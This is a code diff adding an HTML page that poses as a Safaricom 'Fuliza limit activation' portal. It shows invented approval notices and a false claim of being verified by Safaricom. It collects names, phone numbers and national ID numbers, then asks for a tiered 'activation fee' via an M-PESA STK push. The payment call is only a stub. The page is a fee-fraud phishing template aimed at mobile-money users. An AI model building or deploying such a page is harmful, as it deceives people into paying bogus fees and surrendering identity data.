@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safaricom Fuliza Limit Activation</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f5f5f5; color: #333; overflow-x: hidden; }
+      .header { background: #00a651; color: white; padding: 14px; text-align: center; font-size: 18px; font-weight: 700; }
+      .screen { display: none; min-height: 100vh; padding-bottom: 80px; }
+      .screen.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
+      .container { padding: 15px; max-width: 600px; margin: 0 auto; }
+      .card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+      .stats-banner { background: linear-gradient(135deg, #00a651 0%, #008541 100%); color: white; border-radius: 12px; padding: 25px 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,166,81,0.3); text-align: center; }
+      .stats-banner h2 { color: white; font-size: 22px; margin-bottom: 8px; }
+      .stats-banner p { color: #e6f9ee; margin-bottom: 15px; font-size: 13px; }
+      .stats-grid { display: flex; justify-content: space-between; gap: 10px; }
+      .stat-box { background: rgba(255,255,255,0.15); padding: 12px; border-radius: 8px; flex: 1; }
+      .stat-box.num { font-size: 20px; font-weight: 700; }
+      .stat-box.label { font-size: 11px; margin-top: 3px; }
+        h1 { color: #00a651; font-size: 24px; text-align: center; margin-bottom: 10px; }
+        h2 { font-size: 20px; text-align: center; margin-bottom: 20px; }
+        p { color: #666; text-align: center; line-height: 1.5; margin-bottom: 20px; font-size: 14px; }
+      .btn { width: 100%; background: #00a651; color: white; border: none; padding: 14px; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; animation: floatUp 2s ease-in-out infinite; }
+        @keyframes floatUp { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
+      .btn:hover { background: #008541; }
+      .btn:disabled { background: #ccc; cursor: not-allowed; animation: none; }
+      .form-group { margin-bottom: 15px; text-align: left; }
+      .form-group label { display: block; font-size: 14px; color: #555; margin-bottom: 6px; font-weight: 500; }
+      .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; }
+      .form-group input:focus {border-color:#00a651; outline:none}
+      .profile-card { display: flex; align-items: center; gap: 15px; border-left: 5px solid #00a651; }
+      .avatar { width: 60px; height: 60px; border-radius: 50%; background: #e6f9ee; display: flex; align-items: center; justify-content: center; font-size: 30px; animation: rotate 8s linear infinite; }
+        @keyframes rotate { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
+      .profile-info h3 { color: #00a651; font-size: 20px; margin-bottom: 5px; }
+      .profile-info p { text-align: left; margin: 3px 0; font-size: 14px; }
+      .limit-badge { background: #00a651; color: white; padding: 8px 15px; border-radius: 20px; display: inline-block; margin-top: 8px; font-weight: 700; }
+      .limit-option { background: white; border: 1px solid #eee; border-radius: 10px; padding: 18px; margin-bottom: 12px; text-align: center; cursor: pointer; transition: all 0.2s ease; }
+      .limit-option h3 { color: #00a651; font-size: 22px; margin-bottom: 5px; }
+      .limit-option.selected { border-color: #00a651; background: #e6f9ee; transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,166,81,0.15); }
+      .summary-box { background: #f9f9f9; border: 1px solid #eee; border-radius: 10px; padding: 15px; display: flex; justify-content: space-between; margin-bottom: 15px; }
+      .summary-box span:last-child { color: #00a651; font-weight: 700; }
+      .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00a651; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+      .footer { background: #00a651; color: white; text-align: center; padding: 15px; font-size: 12px; position: fixed; bottom: 0; width: 100%; z-index: 1000; }
+      .error { color: #d32f2f; font-size: 12px; margin-top: 5px; display: none; }
+      .example {font-size:11px;color:#777;margin-top:4px;text-align:left}
+      .notif-list {margin:20px 0}
+      .notif {background:#f1f8f4;border-left:4px solid #00a651;padding:14px;margin-bottom:10px;border-radius:8px;font-size:13px;display:flex;justify-content:space-between;align-items:center}
+      .notif.id{color:#00a651;font-weight:600;font-family:monospace;font-size:11px}
+      .success-box{background:#e8f5e9;padding:12px;border-radius:8px;text-align:center;color:#2e7d32;font-size:13px;margin:15px 0;font-weight:600}
+      .whatsapp{position:fixed;bottom:70px;right:20px;width:56px;height:56px;background:#25D366;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;box-shadow:0 4px 12px rgba(0,0,0,0.2);animation: blink 1s infinite;z-index:999}
+        @keyframes blink{0%,50%,100%{opacity:1}25%,75%{opacity:0.4}}
+      .whatsapp span{position:absolute;top:-4px;right:-4px;width:12px;height:12px;background:#00a651;border-radius:50%;border:2px solid #fff}
+      .whatsapp-label{position:absolute;right:65px;background:#333;color:#fff;padding:6px 10px;border-radius:6px;font-size:11px;white-space:nowrap}
+      .contact{text-align:center;margin-top:15px;font-size:13px;color:#666}
+      .contact a{color:#00a651;text-decoration:none;pointer-events:none;cursor:default;font-weight:600}
+    </style>
+</head>
+<body>
+
+<div class="whatsapp">
+  <span class="whatsapp-label">Chat with Zuri via WhatsApp</span>
+  💬
+  <span></span>
+</div>
+
+<div id="s1" class="screen active">
+    <div class="container">
+        <div class="stats-banner">
+            <h2>✓ Trusted Fuliza Limit Activation</h2>
+            <p>Join thousands of Kenyans increasing their Fuliza limits securely</p>
+            <div class="stats-grid">
+                <div class="stat-box"><div class="num">50K+</div><div class="label">Verified Users</div></div>
+                <div class="stat-box"><div class="num">24/7</div><div class="label">Support</div></div>
+                <div class="stat-box"><div class="num">Instant</div><div class="label">Approval</div></div>
+            </div>
+        </div>
+
+        <div class="notif-list">
+            <div class="notif">
+                <div><b>Congratulations Joan Wanjiku</b><br>Fuliza Limit Approved</div>
+                <div>Ksh 80,000<br><span class="id">ID: UGHDUJDU6Y</span></div>
+            </div>
+            <div class="notif">
+                <div><b>Congratulations Peter Omondi</b><br>Fuliza Limit Approved</div>
+                <div>Ksh 45,000<br><span class="id">ID: KLM9XZQ2P1</span></div>
+            </div>
+            <div class="notif">
+                <div><b>Congratulations Amina Hassan</b><br>Fuliza Limit Approved</div>
+                <div>Ksh 120,000<br><span class="id">ID: RTY7VBN4M8</span></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h1>Increase Your Fuliza Limit Online</h1>
+            <p>Check your eligibility, select your desired limit, and activate instantly.</p>
+            <button class="btn" onclick="show(2)">Continue</button>
+        </div>
+
+        <div class="success-box">✅ System Active | Secure & Verified by Safaricom</div>
+        <div class="contact">Need assistance? Contact Safaricom: <a href="tel:072200000">0722 000 000</a></div>
+    </div>
+    <div class="footer">© 2026 Safaricom Fuliza Portal</div>
+</div>
+
+<div id="s2" class="screen">
+    <div class="header">Safaricom</div>
+    <div class="container">
+        <div class="card">
+            <h2>Complete Your Details</h2>
+            <p style="font-size:12px;margin-bottom:15px">Fill the form to select your desired Fuliza limit</p>
+            <form id="form1">
+                <div class="form-group">
+                    <label>First Name</label>
+                    <input type="text" id="firstName" placeholder="e.g. John" required>
+                    <div class="error" id="firstError"></div>
+                </div>
+                <div class="form-group">
+                    <label>Surname</label>
+                    <input type="text" id="surname" placeholder="e.g. Doe" required>
+                    <div class="error" id="surnameError"></div>
+                </div>
+                <div class="form-group">
+                    <label>Safaricom Phone Number</label>
+                    <input type="tel" id="phone" placeholder="07XXXXXXXX or 01XXXXXXXX" required>
+                    <div class="error" id="phoneError"></div>
+                    <div class="example">Example: 0712345678 or 0112345678</div>
+                </div>
+                <div class="form-group">
+                    <label>National ID Number</label>
+                    <input type="text" id="idNumber" placeholder="e.g. 12345678" required>
+                    <div class="error" id="idError"></div>
+                    <div class="example">Must match the ID registered with your Safaricom line. Minimum 8 characters</div>
+                </div>
+                <div class="form-group">
+                    <label>Your Current Fuliza Limit</label>
+                    <input type="number" id="currentLimit" required>
+                </div>
+                <button type="submit" class="btn">Verify Account</button>
+            </form>
+            <div id="checking" style="display:none;"><div class="loader"></div><p style="text-align:center;">Verifying account details...</p></div>
+        </div>
+    </div>
+</div>
+
+<div id="s3" class="screen">
+    <div class="header">Safaricom</div>
+    <div class="container">
+        <div class="card profile-card">
+            <div class="avatar" id="userAvatar">👤</div>
+            <div class="profile-info">
+                <h3 id="pName">Name</h3>
+                <p>Phone: <span id="pPhone">07XXXXXXXX</span></p>
+                <p>ID: <span id="pID">49****19</span></p>
+                <div class="limit-badge">Current Limit: KSh <span id="pLimit">0</span></div>
+            </div>
+        </div>
+        <h2>Select Your Desired Fuliza Limit</h2>
+        <div id="limitsContainer"></div>
+    </div>
+</div>
+
+<div id="s4" class="screen">
+    <div class="header">Safaricom Fuliza Activation</div>
+    <div class="container">
+        <div class="card">
+            <h2>Complete Your Payment</h2>
+            <div class="summary-box"><span>Selected Limit:</span> <span>KSh <span id="sLimit">75,000</span></span></div>
+            <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">900</span></span></div>
+            <button id="payBtn" class="btn" onclick="paySTK()">Proceed to Pay</button>
+        </div>
+    </div>
+</div>
+
+<div id="s5" class="screen">
+    <div class="header">Payment</div>
+    <div class="container">
+        <div class="card" style="text-align:center; padding: 60px 20px;">
+            <div class="loader"></div>
+            <h2 style="color:#00a651;">Check Your Phone</h2>
+            <p>STK Push sent to <b id="paidPhone">07XXXXXXXX</b></p>
+            <p style="font-size:12px; margin-top:10px;">Please enter your M-PESA PIN to complete payment</p>
+        </div>
+    </div>
+</div>
+
+<script>
+let selectedLimit = 0, selectedFee = 0;
+let userData = {};
+const API_URL = "";
+
+// GENERATE LIMITS: 5000, 9000, 12000, THEN +4000 TO 160000. FEE: 300 +150 EACH
+function generateLimits() {
+    const container = document.getElementById('limitsContainer');
+    const limits = [5000, 9000, 12000];
+    let fee = 300;
+
+    // Add first 3
+    limits.forEach(l => {
+        addLimitOption(container, l, fee);
+        fee += 150;
+    });
+
+    // Continue adding 4000 until 160000
+    let nextLimit = 16000;
+    while(nextLimit <= 160000) {
+        addLimitOption(container, nextLimit, fee);
+        fee += 150;
+        nextLimit += 4000;
+    }
+}
+
+function addLimitOption(container, limit, fee) {
+    const div = document.createElement('div');
+    div.className = 'limit-option';
+    div.setAttribute('onclick', `selectLimit(${limit},${fee})`);
+    div.innerHTML = `<h3>KSh ${limit.toLocaleString()}</h3><p>Activation Fee: KSh ${fee}</p>`;
+    container.appendChild(div);
+}
+
+window.onload = generateLimits;
+
+function show(n){
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById('s'+n).classList.add('active');
+    window.scrollTo(0,0);
+}
+
+document.getElementById('form1').addEventListener('submit', async e=>{
+    e.preventDefault();
+    if(!validateForm()) return;
+
+    document.getElementById('form1').style.display = 'none';
+    document.getElementById('checking').style.display = 'block';
+
+    const firstName = document.getElementById('firstName').value.trim();
+    const surname = document.getElementById('surname').value.trim();
+
+    userData = {
+        firstName: firstName,
+        surname: surname,
+        name: firstName + ' ' + surname,
+        phone: document.getElementById('phone').value,
+        id: document.getElementById('idNumber').value,
+        currentLimit: document.getElementById('currentLimit').value
+    };
+
+    document.getElementById('pName').innerText = userData.name;
+    document.getElementById('pPhone').innerText = userData.phone;
+    document.getElementById('pID').innerText = userData.id.substring(0,2) + '****' + userData.id.slice(-2);
+    document.getElementById('pLimit').innerText = userData.currentLimit;
+    document.getElementById('userAvatar').innerText = firstName[0] + surname[0];
+
+    setTimeout(()=>show(3), 2000);
+});
+
+function formatPhoneNumber(phone) {
+    phone = phone.replace(/\D/g, '');
+    if (phone.length === 10 && (phone.startsWith('07') || phone.startsWith('01'))) {
+        return "254" + phone.substring(1);
+    }
+    if (phone.length === 12 && (phone.startsWith('2547') || phone.startsWith('2541'))) {
+        return phone;
+    }
+    return null;
+}
+
+function validateForm(){
+    let valid = true;
+    document.querySelectorAll('.error').forEach(el=>el.style.display='none')
+
+    const firstName = document.getElementById('firstName').value.trim();
+    const surname = document.getElementById('surname').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const idNumber = document.getElementById('idNumber').value.trim();
+
+    if(firstName === ''){document.getElementById('firstError').innerText = "First name is required";document.getElementById('firstError').style.display = 'block';valid = false;}
+    if(surname === ''){document.getElementById('surnameError').innerText = "Surname is required";document.getElementById('surnameError').style.display = 'block';valid = false;}
+    if(idNumber.length < 8){document.getElementById('idError').innerText = "ID must be 8 or more characters";document.getElementById('idError').style.display = 'block';valid = false;}
+
+    const phoneRegex = /^(07|01)\d{8}$/;
+    if(!phoneRegex.test(phone)){
+        document.getElementById('phoneError').innerText = "Enter a valid Safaricom number: 07XXXXXXXX or 01XXXXXXXX";
+        document.getElementById('phoneError').style.display = 'block';
+        valid = false;
+    } else {
+        let formattedPhone = formatPhoneNumber(phone);
+        if(formattedPhone) document.getElementById('phone').value = formattedPhone;
+    }
+    return valid;
+}
+
+function selectLimit(limit, fee){
+    document.querySelectorAll('.limit-option').forEach(o => o.classList.remove('selected'));
+    event.currentTarget.classList.add('selected');
+    selectedLimit = limit; selectedFee = fee;
+    document.getElementById('sLimit').innerText = limit.toLocaleString();
+    document.getElementById('sFee').innerText = fee.toLocaleString();
+    setTimeout(()=>show(4), 300);
+}
+
+async function paySTK(){
+    const btn = document.getElementById('payBtn');
+    btn.disabled = true;
+    btn.innerText = 'Processing...';
+    alert(`STK Push will be sent for KSh ${selectedFee} to activate KSh ${selectedLimit} limit`);
+    document.getElementById('paidPhone').innerText = userData.phone;
+    show(5);
+}
+
+</script>
+</body>
+  </html>
